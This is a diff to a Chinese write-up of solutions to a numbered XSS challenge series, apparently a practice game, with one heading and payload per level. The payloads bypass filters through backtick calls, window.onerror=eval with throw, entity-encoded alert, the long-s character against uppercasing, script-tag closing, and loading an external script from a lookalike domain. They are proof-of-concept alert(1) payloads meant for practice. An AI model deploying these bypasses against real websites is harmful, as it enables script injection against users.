@@ -121,16 +121,14 @@ alert(1)-->    // HTML 单行注释符
 
 ### 0x03 - 括号过滤
 ```javascript
+// 方案 1：反引号替代
 <script>alert`1`</script>
-```
-```javascript
+
+// 方案 2：throw 绕过
 <svg/onload="window.onerror=eval;throw'=alert\x281\x29';">
 ```
 
 ### 0x04 - 括号和反引号过滤
-```javascript
-<img src=x onerror=alert(1)>
-```
 ```javascript
 <img src onerror="window.onerror=eval;throw'=alert\x281\x29';">
 ```
@@ -170,13 +168,13 @@ http://www.segmentfault.com" onerror="alert(1)
 https://www.segmentfault.com.haozi.me/j.js
 ```
 
-### 0x0B - 大写转换+实体编码绕过
+### 0x0B - 大写转换 + 实体编码绕过
 
 ```javascript
 </H1> <img src=M onerror=&#97;&#108;&#101;&#114;&#116;(1)>
 ```
 
-### 0x0C - 过滤 script + 大写转换+实体编码绕过
+### 0x0C - 过滤 script + 大写转换 + 实体编码绕过
 
 ```javascript
 </H1> <img src onerror=&#97;&#108;&#101;&#114;&#116;(1)>
@@ -191,30 +189,34 @@ alert(1);
 ```
 
 ### 0x0E - 过滤 <+字母 + 大写转换
+
 ```javascript
+// 方案 1：大写转换 + 实体编码
+<ſvg/onload=&#97;&#108;&#101;&#114;&#116;(1)>
+// 方案 2：大写转换 + 引入外部文件
 <ſcript src=https://www.segmentfault.com.haozi.me/j.js></ſcript>
 ```
 
-### 0x0F - 实体编码 + console.error
+### 0x0F - 实体编码 + console.error——括号闭合 + 注释绕过
 ```javascript
 '),alert(1); //
 ```
 
-### 0x10 - 无过滤
+### 0x10 - window.data赋值无过滤
 ```javascript
 alert(1);
 ```
 
-### 0x11 - JavaScript 字符串转义
+### 0x11 - JavaScript 特殊字符串转义 + 注释绕过
 ```javascript
 "); alert(1) //
 ```
 
 ### 0x12 - 仅过滤双引号
 ```javascript
+//方案 1：双引号转义
 \");alert(1)//
-```
-```javascript
+//方案 2：闭合script标签
 </script><script>alert(1)</script>
 ```
 
